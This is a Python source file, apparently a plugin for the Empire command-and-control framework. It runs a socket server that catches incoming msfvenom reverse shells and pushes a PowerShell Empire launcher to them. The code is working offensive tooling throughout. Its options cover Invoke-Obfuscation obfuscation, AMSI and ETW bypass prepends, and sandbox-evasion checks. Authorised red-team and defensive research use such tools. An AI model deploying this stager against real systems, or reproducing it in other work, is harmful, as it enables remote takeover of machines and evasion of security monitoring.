import contextlib
import logging
import socket

from empire.server.common import helpers
from empire.server.common.plugins import Plugin
from empire.server.core.plugin_service import PluginService

log = logging.getLogger(__name__)


class Plugin(Plugin):
    def onLoad(self):
        self.info = {
            "Name": "reverseshell_stager_server",
            "Authors": [
                {
                    "Name": "Anthony Rose",
                    "Handle": "@Cx01N",
                    "Link": "https://twitter.com/Cx01N_",
                }
            ],
            "Description": (
                "Server for reverseshell using msfvenom to act as a stage 0."
            ),
            "Software": "",
            "Techniques": [""],
            "Comments": [],
        }

        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "LocalHost": {
                "Description": "Address for the reverse shell to connect back to.",
                "Required": True,
                "Value": "0.0.0.0",
            },
            "LocalPort": {
                "Description": "Port on local host for the reverse shell.",
                "Required": True,
                "Value": "9999",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output.",
                "Required": False,
                "Value": "launcher.exe",
            },
            "Base64": {
                "Description": "Switch. Base64 encode the output.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "Obfuscate": {
                "Description": "Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "SafeChecks": {
                "Description": "Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.",
                "Required": True,
                "Value": "True",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": "Proxy credentials ([domain\\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "mattifestation etw",
            },
            "Status": {
                "Description": "<start/stop/status>",
                "Required": True,
                "Value": "start",
                "SuggestedValues": ["start", "stop", "status"],
                "Strict": True,
            },
        }

    def execute(self, command):
        try:
            self.reverseshell_proc = None
            self.status = command["Status"]
            return self.do_server(command)
        except Exception as e:
            log.error(e)
            return False, f"[!] {e}"

    def get_commands(self):
        return self.commands

    def register(self, mainMenu):
        """
        any modifications to the mainMenu go here - e.g.
        registering functions to be run by user commands
        """
        self.installPath = mainMenu.installPath
        self.main_menu = mainMenu
        self.plugin_service: PluginService = mainMenu.pluginsv2

    def do_server(self, command):  # noqa: PLR0911
        """
        Check if the Empire C# server is already running.
        """
        if self.reverseshell_proc:
            self.enabled = True
        else:
            self.enabled = False

        if self.status == "status":
            if self.enabled:
                return "[+] Reverseshell server is currently running"
            return "[!] Reverseshell server is currently stopped"

        if self.status == "stop":
            if self.enabled:
                self.shutdown()
                return "[!] Stopped reverseshell server"
            return "[!] Reverseshell server is already stopped"

        if self.status == "start":
            # extract all of our options
            language = command["Language"]
            listener_name = command["Listener"]
            base64 = command["Base64"]
            obfuscate = command["Obfuscate"]
            obfuscate_command = command["ObfuscateCommand"]
            user_agent = command["UserAgent"]
            proxy = command["Proxy"]
            proxy_creds = command["ProxyCreds"]
            stager_retries = command["StagerRetries"]
            safe_checks = command["SafeChecks"]
            lhost = command["LocalHost"]
            lport = command["LocalPort"]

            encode = False
            if base64.lower() == "true":
                encode = True

            invoke_obfuscation = False
            if obfuscate.lower() == "true":
                invoke_obfuscation = True

            # generate the launcher code
            self.launcher = self.main_menu.stagers.generate_launcher(
                listener_name,
                language=language,
                encode=encode,
                obfuscate=invoke_obfuscation,
                obfuscation_command=obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                stagerRetries=stager_retries,
                safeChecks=safe_checks,
                bypasses=command["Bypasses"],
            )

            if self.launcher == "":
                return False, "[!] Error in launcher command generation."

            self.reverseshell_proc = helpers.KThread(
                target=self.server_listen, args=(str(lhost), str(lport))
            )
            self.reverseshell_proc.daemon = True
            self.reverseshell_proc.start()
            return None
        return None

    def shutdown(self):
        with contextlib.suppress(Exception):
            self.reverseshell_proc.kill()
            self.thread.kill()

    def client_handler(self, client_socket):
        self.thread = helpers.KThread(target=self.o, args=[client_socket])
        self.thread.daemon = True
        self.thread.start()
        try:
            buffer = self.launcher + "\n"
            client_socket.send(buffer.encode())
        except KeyboardInterrupt:
            client_socket.close()
        except Exception:
            client_socket.close()

    def server_listen(self, host, port):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((host, int(port)))
        except Exception:
            return f"[!] Can't bind at {host}:{port}"

        self.plugin_service.plugin_socketio_message(
            self.info["Name"], f"[*] Listening on {port} ..."
        )
        server.listen(5)

        try:
            while self.status == "start":
                client_socket, addr = server.accept()
                self.client_handler(client_socket)
        except KeyboardInterrupt:
            return None

    def o(self, s):
        while 1:
            try:
                data = ""
                while 1:
                    packet = s.recv(1024)
                    data += packet.decode()
                    if len(packet) < 1024:
                        break
                if not len(data):
                    s.close()
                    break
            except Exception:
                s.close()
                break
